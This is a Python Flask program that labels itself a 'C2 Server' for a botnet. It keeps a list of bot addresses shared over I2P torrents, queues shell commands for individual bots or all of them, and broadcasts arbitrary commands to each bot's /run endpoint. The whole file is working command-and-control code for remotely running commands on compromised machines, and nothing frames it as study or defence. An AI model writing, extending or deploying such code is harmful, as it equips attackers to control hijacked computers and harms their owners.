from flask import Flask, request, jsonify
import os
import threading
import time
import random
import requests
import json

app = Flask(__name__)
SHARED_DIR = "shared_bots"
MAGNET_FILE = "magnet_links.txt"
BOT_LIST = "bots.txt"
COMMAND_FILE = "commands.json"

os.makedirs(SHARED_DIR, exist_ok=True)
if not os.path.exists(BOT_LIST):
    open(BOT_LIST, "w").close()
if not os.path.exists(COMMAND_FILE):
    with open(COMMAND_FILE, "w") as f:
        f.write("{}")

# === Utilities ===

def safe_load_json(path):
    try:
        with open(path, "r") as f:
            return json.load(f)
    except Exception as e:
        print(f"[!] Error loading JSON from {path}: {e}")
        return {}

def safe_save_json(path, data):
    try:
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        print(f"[!] Error saving JSON to {path}: {e}")

def load_all_bots():
    bots = set()
    try:
        with open(BOT_LIST) as f:
            bots.update(line.strip() for line in f if line.strip())
    except Exception as e:
        print(f"[!] Failed to read {BOT_LIST}: {e}")

    for fname in os.listdir(SHARED_DIR):
        try:
            with open(os.path.join(SHARED_DIR, fname)) as f:
                bots.update(line.strip() for line in f if line.strip())
        except Exception as e:
            print(f"[!] Failed to read {fname}: {e}")
    return list(bots)

# === Start i2psnark torrents ===

def check_i2p():
    try:
        r = requests.get("http://127.0.0.1:7657/", timeout=5)
        return r.status_code == 200
    except Exception as e:
        print("[!] I2P is not reachable on 127.0.0.1:7657. Check if it's running.")
        return False

def start_i2p_torrents():
    if not os.path.exists(MAGNET_FILE):
        print("[*] No magnet_links.txt found.")
        return
    with open(MAGNET_FILE) as f:
        for line in f:
            magnet = line.strip()
            if magnet:
                try:
                    requests.post("http://127.0.0.1:7657/i2psnark/",
                                  data={"action": "Add Torrent", "magnet": magnet}, timeout=10)
                    print(f"[✓] Added magnet: {magnet}")
                except Exception as e:
                    print(f"[!] Failed to add magnet: {magnet} — {e}")

def sync_shared_bots():
    while True:
        bots = load_all_bots()
        try:
            with open(BOT_LIST, "w") as f:
                for bot in sorted(set(bots)):
                    f.write(bot + "\n")
        except Exception as e:
            print(f"[!] Could not update bots.txt: {e}")
        time.sleep(60)

# === Flask Endpoints ===

@app.route("/")
def index():
    return "C2 Server is running."

@app.route("/check")
def check():
    result = {"i2p_ok": check_i2p()}
    result["torrents_loaded"] = os.path.exists(MAGNET_FILE)
    result["shared_bots_dir"] = os.path.isdir(SHARED_DIR)
    result["known_bots"] = len(load_all_bots())
    return jsonify(result)

@app.route("/bots")
def bots():
    return jsonify(load_all_bots())

@app.route("/heartbeat")
def heartbeat():
    bots = load_all_bots()
    alive = []
    for bot in bots:
        try:
            r = requests.get(f"http://{bot}/ping", timeout=2)
            if r.status_code == 200 and "pong" in r.text.lower():
                alive.append(bot)
        except:
            continue
    return jsonify({"alive": alive, "count": len(alive)})

@app.route("/getcmd/<botid>")
def get_cmd(botid):
    cmds = safe_load_json(COMMAND_FILE)
    return cmds.get(botid, "")

@app.route("/sendcmd", methods=["POST"])
def send_cmd():
    data = request.json
    botid = data.get("botid")
    cmd = data.get("cmd")
    if not botid or not cmd:
        return jsonify({"error": "Missing botid or cmd"}), 400

    cmds = safe_load_json(COMMAND_FILE)
    cmds[botid] = cmd
    safe_save_json(COMMAND_FILE, cmds)
    return jsonify({"status": "Command set for bot."})

@app.route("/runall", methods=["POST"])
def runall():
    data = request.json
    cmd = data.get("cmd")
    if not cmd:
        return jsonify({"error": "Missing cmd"}), 400

    cmds = safe_load_json(COMMAND_FILE)
    for bot in load_all_bots():
        cmds[bot] = cmd
    safe_save_json(COMMAND_FILE, cmds)
    return jsonify({"status": f"Command set for {len(cmds)} bots."})

@app.route("/broadcast", methods=["POST"])
def broadcast_cmd():
    cmd = request.json.get("cmd")
    if not cmd:
        return jsonify({"error": "Missing cmd"}), 400

    bots = load_all_bots()
    success = 0
    for bot in bots:
        try:
            r = requests.post(f"http://{bot}/run", json={"cmd": cmd}, timeout=3)
            if r.status_code == 200:
                success += 1
        except:
            pass
    return jsonify({"sent": success, "total": len(bots)})

# === Run server ===

def run():
    print("[*] Checking I2P connection...")
    if not check_i2p():
        print("[!] WARNING: I2P is not reachable. Proceeding anyway.")

    print("[*] Starting I2P torrent syncing...")
    start_i2p_torrents()

    print("[*] Sync thread started.")
    threading.Thread(target=sync_shared_bots, daemon=True).start()

    print("[*] Flask server listening on 0.0.0.0:8080")
    app.run(host="0.0.0.0", port=8080)

if __name__ == "__main__":
    run()
